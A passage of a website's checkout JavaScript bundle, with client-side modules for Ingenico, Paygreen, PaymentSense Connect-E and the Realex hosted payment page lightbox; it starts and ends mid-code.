    ghost_form.append('<input type="hidden" name="browserScreenWidth" value="' + screen.width + '"/>')
    ghost_form.append('<input type="hidden" name="browserTimeZone" value="' + new Date().getTimezoneOffset() + '"/>')
    ghost_form.append('<input type="hidden" name="browserUserAgent" value="' + navigator.userAgent + '"/>')
  }

  var payWithSavedCard = function (saved_card_id, brand) {
    var brand_config = config.brands[brand]
    var field_to_check = $j.map(brand_config.stored_card_inputs, function (value, key) {
      return $j('[data-ingenico-saved-card=' + saved_card_id + '] .' + value)
    })
    if (!checkFields(field_to_check)) {
      return
    }

    var ghost_form = $j('<form action="/ingenico_direct_link_payments/use_saved_card" method="POST" id="ingenico_ghost_form" style="display:none;"></form>')
    addPassthroughFields($j('#step4_form'), ghost_form)

    ghost_form.append('<input type="hidden" name="saved_card_id" value="' + saved_card_id + '" />')

    $j.each(brand_config.stored_card_inputs, function (key, value) {
      var input_value = $j('[data-ingenico-saved-card=' + saved_card_id + '] [name=' + key + ']').val()
      ghost_form.append('<input type="hidden" name="' + key + '" value="' + input_value + '" />')
    })

    ingenico3Dparams(ghost_form)

    $j('body').append(ghost_form)
    $j('#ingenico_ghost_form').submit()
  }

  var payWithNewCard = function (brand) {
    var brand_config = config.brands[brand]
    var field_to_check = $j.map(brand_config.new_card_inputs, function (key, value) {
      return $j('input[name=' + value + ']')
    })
    if (!checkFields(field_to_check)) {
      return
    }

    var ghost_form = $j('<form action="' + direct_alias_url + '" method="POST" id="ingenico_ghost_form" style="display:none;"></form>')
    addPassthroughFields($j('#step4_form'), ghost_form)

    ghost_form.append('<input type="hidden" name="PSPID" value="' + direct_link_psp_id + '"/>')
    ghost_form.append('<input type="hidden" name="ACCEPTURL" value="' + direct_alias_accept_url + '"/>')
    ghost_form.append('<input type="hidden" name="EXCEPTIONURL" value="' + direct_alias_exception_url + '"/>')

    var brand = $j('select[name=ingenico_card_brand]').val()
    ghost_form.append('<input type="hidden" name="BRAND" value="' + brand + '" />')

    $j.each(brand_config.new_card_inputs, function (key, value) {
      var input_value = $j('input[name=' + value + ']').val()
      ghost_form.append('<input type="hidden" name="' + key + '" value="' + input_value + '" />')
    })

    if ($j('input[name=ingenico_save_card]').is(':checked')) {
      ghost_form.append('<input type="hidden" name="ALIASPERSISTEDAFTERUSE" value="Y" />')
      ghost_form.append('<input type="hidden" name="PARAMPLUS" value="save_card" />')
      ghost_form.append('<input type="hidden" name="SHASIGN" value="' + sha_signatures[1][brand] + '" />')
    } else {
      ghost_form.append('<input type="hidden" name="PARAMPLUS" value="" />')
      ghost_form.append('<input type="hidden" name="SHASIGN" value="' + sha_signatures[0][brand] + '" />')
    }

    ingenico3Dparams(ghost_form)

    $j('body').append(ghost_form)
    $j('#ingenico_ghost_form').submit()
  }

  var payment_method_id,
      sha_signatures,
      direct_alias_url,
      direct_alias_accept_url,
      direct_alias_exception_url,
      direct_link_psp_id
  var init = function (_payment_method_id, _sha_signatures,
                       _direct_alias_url, _direct_alias_accept_url, _direct_alias_exception_url, _direct_link_psp_id) {
    payment_method_id = _payment_method_id
    sha_signatures = _sha_signatures
    direct_alias_url = _direct_alias_url
    direct_alias_accept_url = _direct_alias_accept_url
    direct_alias_exception_url = _direct_alias_exception_url
    direct_link_psp_id = _direct_link_psp_id

    $j('select[name="ingenico_card_brand"]').on('change', function (event) {
      var brand_config = config.brands[$j('select[name="ingenico_card_brand"]').val()]
      var input_names = $j.map(brand_config?.new_card_inputs, function (val, key) {
        return val
      })
      $j('form#step4_form .card-entry__new-card input[type="text"]').each(function (_, input) {
        $input = $j(input)
        $input_row = $j($input.closest('.card-entry__row'))
        if ($j.inArray(input.name, input_names) < 0) {
          $input_row.hide()
        } else {
          $input_row.show()
        }
      })
    }).trigger('change')

    $j('#step4_submit').click(function (event) {
      if (payment_method_id == Payment.selectedMethodId()) {
        event.preventDefault()

        var $saved_card = $j('input[name="saved_card_id"]:checked')
        var saved_card_id = $saved_card.val()
        if (saved_card_id) {
          payWithSavedCard(saved_card_id, $saved_card.data('brand'))
        } else {
          var brand = $j('select[name="ingenico_card_brand"]').val()
          payWithNewCard(brand)
        }
      }
    })

    $j('input[name="saved_card_id"]').click(cardClicked)
    cardClicked()
  }
  return { init: init }
})()
/*****************************
 Payment Paygreen
 *****************************/
var PaymentPaygreen = (function () {
  var selectType = function (payment_type_name) {
    localStorage.setItem("paygreen_payment_type", payment_type_name);
  }

  var selectedType = function () {
    return localStorage.getItem("paygreen_payment_type");
  }

  var typeSelected = function () {
    $j('[data-payment-type]').hide()
    $j('[data-payment-type=' + selectedType() + ']').show()
  }

  return {
    selectType: selectType,
    selectedType: selectedType,
    typeSelected: typeSelected
  }
}())
 let connectE;

var PaymentSenseConnectE = (function () {
    const payConfig = {
        paymentDetails: {
            amount: "tbc",
            currencyCode: "826", // TODO: currency map
            paymentToken: "tbc",
        },
        containerId: "demo-payment",
        fontCss: ['https://fonts.googleapis.com/css?family=Do+Hyeon'],
        styles: {
            base: {
                default: {
                    color: "black",
                    textDecoration: "none",
                    fontFamily: "'Do Hyeon', sans-serif",
                    boxSizing: "border-box",
                    padding: ".375rem .75rem",
                    boxShadow: 'none',
                    fontSize: '1rem',
                    borderRadius: '.25rem',
                    lineHeight: '1.5',
                    backgroundColor: '#fff',

                },
                focus: {
                    color: '#495057',
                    borderColor: '#80bdff',
                },
                error: {
                    color: "#B00",
                    borderColor: "#B00"
                },
                valid: {
                    color: "green",
                    borderColor: 'green'
                },
                label: {
                    display: 'none'
                }
            },
            cv2: {
                container: {
                    width: "50%",
                    float: "left",
                    boxSizing: "border-box"
                },
                default: {
                    borderRadius: "0 .25rem .25rem 0"
                }
            },
            expiryDate: {
                container: {
                    width: "50%",
                    float: "left",
                    borderRadius: '0rem',
                },
                default: {
                    borderRadius: "0",
                    borderRight: "none"
                },
            },
            cardNumber: {
                container: {
                    width: "100%",
                    float: "left",
                },
                default: {
                    borderRadius: ".25rem 0 0 .25rem",
                    borderRight: "none"
                },
            }
        }
    };

    function showErrorMessage(message) {
        const errorMsg = document.getElementById("errorMsg");
        errorMsg.classList.remove('hidden');
        errorMsg.innerText = message;
    }

    function clearErrorMessage() {
        // const errorMsg = document.getElementById("errorMsg");
        // errorMsg.classList.add('hidden');
        // errorMsg.innerText = "";
    }

    function processConfirmPayment(confirmPaymentCallback = function (response) { }) {
        clearErrorMessage();

        const order_id = document.getElementById("order_id").innerText;

        // TODO: use @payment_sense_payment_url
        url = '/payment_sense_connect_e_payments/' + Number(order_id) + '/payments/' + payConfig.paymentDetails.paymentToken;
        window.location.href = url;
    }

    function displayErrors(errors) {
        console.log(errors);
        const errorsDiv = document.getElementById('errors');
        errorsDiv.innerHTML = '';
        if (errors && errors.length) {
            const list = document.createElement("ul");
            for (const error of errors) {
                const item = document.createElement("li");
                item.innerText = error.message;
                list.appendChild(item);
            }
            errorsDiv.appendChild(list);
        }
    }

    function processOrder(tokenCallback = function (response) { }) {
        clearErrorMessage();

        disableOrderFormInputs();
        const btnOrder = document.getElementById("btnOrder");
        btnOrder.disabled = true;
        btnOrder.innerText = "Loading..."  // TODO: to be translated

        processPaymentToken(tokenCallback);
    }

    function processPaymentToken(transaction_id, tokenCallback = function (response) { }) {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'payment_sense_connect_e_payments/' + transaction_id + '/access_token', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        xhr.onreadystatechange = function () {
            processPaymentTokenRequestStateChange(xhr, tokenCallback);
        }

        params = "";

        xhr.send(params);
    }

    function processPaymentTokenRequestStateChange(xhr, tokenCallback = function (response) { }) {
        if (xhr.readyState !== 4) {
            return;
        }
        if (xhr.status !== 200 && xhr !== 201) {
            console.error("unexpected api response code", xhr.status, xhr.responseText);

            // TODO: show error

            return;
        }
        const response = JSON.parse(xhr.responseText);
        if (typeof response.id === 'undefined') {
            console.error("unexpected api response", response);
            // TODO: show error
            return;
        }

        if (typeof tokenCallback === 'function') {
            tokenCallback(response)
        }
    }

    var processPayment = function(transaction_id, transaction_amount, confirmPaymentCallback = function (response) { }) {
        clearErrorMessage();

        processPaymentToken(transaction_id, function (response) {
            payConfig.paymentDetails.amount = transaction_amount;
            payConfig.paymentDetails.paymentToken = response.id;

            connectE = new Connect.ConnectE(payConfig, displayErrors);

            // now the form is loaded we can enable the pay button
            const btnTestPay = document.getElementById("payment_sense_connect_e_submit_button");
            btnTestPay.removeAttribute("disabled");
        });
    };

    var executePayment = function(confirmPaymentCallback = function (response) { }) {
        const btnTestPay = document.getElementById("payment_sense_connect_e_submit_button");

        btnTestPay.innerText = 'loading';
        btnTestPay.setAttribute("disabled", "true");
        connectE.executePayment()
            .then(function (data) {
                processPaymentSuccess(data, confirmPaymentCallback);
            }).catch(function (data) {
                processPaymentError(data);
        });
    }

    function processPaymentSuccess(data, confirmPaymentCallback = function (response) { }) {
        console.log('Payment request Success', data);

        const btnTestPay = document.getElementById("payment_sense_connect_e_submit_button");

        document.getElementById("demo-payment").hidden = true;
        btnTestPay.remove();
        document.getElementById("demo-result").hidden = false;
        document.getElementById("status-code").innerText = data.statusCode;
        document.getElementById("auth-code").innerText = data.authCode;

        processConfirmPayment(confirmPaymentCallback);
    }

    function processPaymentError(data) {
        // TODO maybe only called on timeout
        console.log('Payment request failed', data);

        const btnTestPay = document.getElementById("payment_sense_connect_e_submit_button");

        btnTestPay.innerText = 'Pay';
        btnTestPay.removeAttribute("disabled");
        if (typeof data === 'string') {
            document.getElementById("errors").innerText = data;
        }
        if (data && data.message) {
            document.getElementById("errors").innerText = data.message;
        }

        const order_id = document.getElementById("order_id").innerText;

        // TODO if only on timeout
        // TODO redirect to pending thank you page
        // TODO workflow item pending
        // TODO with order id
        url = '/payment_sense_connect_e_payments/' + Number(order_id) + '/payments/' + payConfig.paymentDetails.paymentToken;
        window.location.href = url;
    }

    return {
        payConfig: payConfig,
        processPayment: processPayment,
        executePayment: executePayment
    };
}());

let connectEWallet;

var PaymentSenseConnectEWallet = (function () {
    const payConfig = {
        containerId: 'payment-wallet',
        paymentDetails: {
            paymentToken: 'tbc'
        },
        buttonConfig: {
            color: 'black',
            type: 'plain'
        },
        emailRequired: true,
        billingAddressRequired: false,
        shippingAddressRequired: false
    }
    

    function displayErrors(errors) {
        console.log(errors);
        const errorsDiv = document.getElementById('errors');
        errorsDiv.innerHTML = '';
        if (errors && errors.length) {
            const list = document.createElement("ul");
            for (const error of errors) {
                const item = document.createElement("li");
                item.innerText = error.message;
                list.appendChild(item);
            }
            errorsDiv.appendChild(list);
        }
    }

    function processPaymentToken(transaction_id, tokenCallback = function (response) { }) {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'payment_sense_connect_e_payments/' + transaction_id + '/access_token', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        xhr.onreadystatechange = function () {
            processPaymentTokenRequestStateChange(xhr, tokenCallback);
        }

        params = "";

        xhr.send(params);
    }

    function processPaymentTokenRequestStateChange(xhr, tokenCallback = function (response) { }) {
        if (xhr.readyState !== 4) {
            return;
        }
        if (xhr.status !== 200 && xhr !== 201) {
            console.error("unexpected api response code", xhr.status, xhr.responseText);

            // TODO: show error

            return;
        }
        const response = JSON.parse(xhr.responseText);
        if (typeof response.id === 'undefined') {
            console.error("unexpected api response", response);
            // TODO: show error
            return;
        }

        if (typeof tokenCallback === 'function') {
            tokenCallback(response)
        }
    }

    var processPayment = function(transaction_id, transaction_amount) {

        if (document.getElementById('payment-wallet') == null) {
            return;
        }
        
        processPaymentToken(transaction_id, function (response) {
            payConfig.paymentDetails.amount = transaction_amount;
            payConfig.paymentDetails.paymentToken = response.id;

            connectEWallet = new Connect.Wallet(payConfig, displayErrors, paymentExecuted);
        });
    };

    function paymentExecuted(data) {
        console.log('Payment request executed', data);

        const order_id = document.getElementById("order_id").innerText;

        // TODO: use @payment_sense_payment_url
        url = '/payment_sense_connect_e_payments/' + Number(order_id) + '/payments/' + payConfig.paymentDetails.paymentToken;
        window.location.href = url;
    };

    return {
        payConfig: payConfig,
        processPayment: processPayment
    };
}());/*****************************
 Payment Realex
 From: https://github.com/realexpayments/rxp-js
 *****************************/

var RealexHpp = (function () {
  'use strict'

  var hppUrl

  var randomId = randomId || Math.random().toString(16).substr(2, 8)

  var isWindowsMobileOs = /Windows Phone|IEMobile/.test(navigator.userAgent)
  var isAndroid = /Android/.test(navigator.userAgent)
  var isMobileXS = ((((window.innerWidth > 0) ? window.innerWidth : screen.width) <= 360 ? true : false) || (((window.innerHeight > 0) ? window.innerHeight : screen.Height) <= 360 ? true : false))

  // Display IFrame on WIndows Phone OS mobile devices
  var isMobileIFrame = isWindowsMobileOs

  // For IOs/Android and small screen devices always open in new tab/window
  var isMobileNewTab = !isWindowsMobileOs && (isAndroid || isMobileXS)
  var tabWindow

  // Initialising some variables used throughout this file.
  var RxpLightbox = (function () {

    var instance

    function init () {
      var overlayElement
      var spinner
      var iFrame
      var closeButton
      var token

      function checkDevicesOrientation () {
        if (window.orientation === 90 || window.orientation === -90) {
          return true
        } else {
          return false
        }
      }

      var isLandscape = checkDevicesOrientation()

      if (isMobileIFrame) {
        if (window.addEventListener) {
          window.addEventListener('orientationchange', function () {
            isLandscape = checkDevicesOrientation()
          }, false)
        }
      }

      // Initialising some variables used throughout this function.
      function createOverlay () {
        var overlay = document.createElement('div')
        overlay.setAttribute('id', 'rxp-overlay-' + randomId)
        overlay.style.position = 'fixed'
        overlay.style.width = '100%'
        overlay.style.height = '100%'
        overlay.style.top = '0'
        overlay.style.left = '0'
        overlay.style.transition = 'all 0.3s ease-in-out'
        overlay.style.zIndex = '100'

        if (isMobileIFrame) {
          overlay.style.position = 'absolute !important'
          overlay.style.WebkitOverflowScrolling = 'touch'
          overlay.style.overflowX = 'hidden'
          overlay.style.overflowY = 'scroll'
        }

        document.body.appendChild(overlay)

        setTimeout(function () {
          overlay.style.background = 'rgba(0, 0, 0, 0.7)'
        }, 1)

        overlayElement = overlay
      }

      function createCloseButton () {
        if (document.getElementById('rxp-frame-close-' + randomId) === null) {
          closeButton = document.createElement('img')
          closeButton.setAttribute('id', 'rxp-frame-close-' + randomId)
          closeButton.setAttribute('src', 'data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QUJFRjU1MEIzMUQ3MTFFNThGQjNERjg2NEZCRjFDOTUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QUJFRjU1MEMzMUQ3MTFFNThGQjNERjg2NEZCRjFDOTUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBQkVGNTUwOTMxRDcxMUU1OEZCM0RGODY0RkJGMUM5NSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBQkVGNTUwQTMxRDcxMUU1OEZCM0RGODY0RkJGMUM5NSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PlHco5QAAAHpSURBVHjafFRdTsJAEF42JaTKn4glGIg++qgX4AAchHAJkiZcwnAQD8AF4NFHCaC2VgWkIQQsfl/jNJUik8Duzs/XmW9mN7Xb7VRc5vP5zWKxaK5Wq8Zmu72FqobfJG0YQ9M0+/l8/qFQKDzGY1JxENd1288vLy1s786KRZXJZCLber1Wn7MZt4PLarVnWdZ9AmQ8Hncc17UvymVdBMB/MgPQm+cFFcuy6/V6lzqDf57ntWGwYdBIVx0TfkBD6I9M35iRJgfIoAVjBLDZbA4CiJ5+9AdQi/EahibqDTkQx6fRSIHcPwA8Uy9A9Gcc47Xv+w2wzhRDYzqdVihLIbsIiCvP1NNOoX/29FQx3vgOgtt4FyRdCgPRarX4+goB9vkyAMh443cOEsIAAcjncuoI4TXWMAmCIGFhCQLAdZ8jym/cRJ+Y5nC5XCYAhINKpZLgSISZgoqh5iiLQrojAFICVwGS7tCfe5DbZzkP56XS4NVxwvTI/vXVVYIDnqmnnX70ZxzjNS8THHooK5hMpxHQIREA+tEfA9djfHR3MHkdx3Hspe9r3B+VzWaj2RESyR2mlCUE4MoGQDdxiwHURq2t94+PO9bMIYyTyDNLwMoM7g8+BfKeYGniyw2MdfSehF3Qmk1IvCc/AgwAaS86Etp38bUAAAAASUVORK5CYII=')
          closeButton.setAttribute('style', 'transition: all 0.5s ease-in-out; opacity: 0; float: left; position: absolute; left: 50%; margin-left: 173px; z-index: 99999999; top: 30px;')

          setTimeout(function () {
            closeButton.style.opacity = '1'
          }, 500)

          if (isMobileIFrame) {
            closeButton.style.position = 'absolute'
            closeButton.style.float = 'right'
            closeButton.style.top = '20px'
            closeButton.style.left = 'initial'
            closeButton.style.marginLeft = '0px'
            closeButton.style.right = '20px'
          }

          closeButton.addEventListener('click', closeModal, true)
          overlayElement.appendChild(closeButton)
        }
      }

      function createForm (doc) {
        var form = document.createElement('form')
        form.setAttribute('method', 'POST')
        form.setAttribute('action', hppUrl)

        for (var key in token) {

          var hiddenField = document.createElement('input')
          hiddenField.setAttribute('type', 'hidden')
          hiddenField.setAttribute('name', key)
          hiddenField.setAttribute('value', token[key])

          form.appendChild(hiddenField)
        }

        return form
      }

      function createIFrame () {

        //Create the spinner
        spinner = document.createElement('img')
        spinner.setAttribute('src', 'data:image/gif;base64,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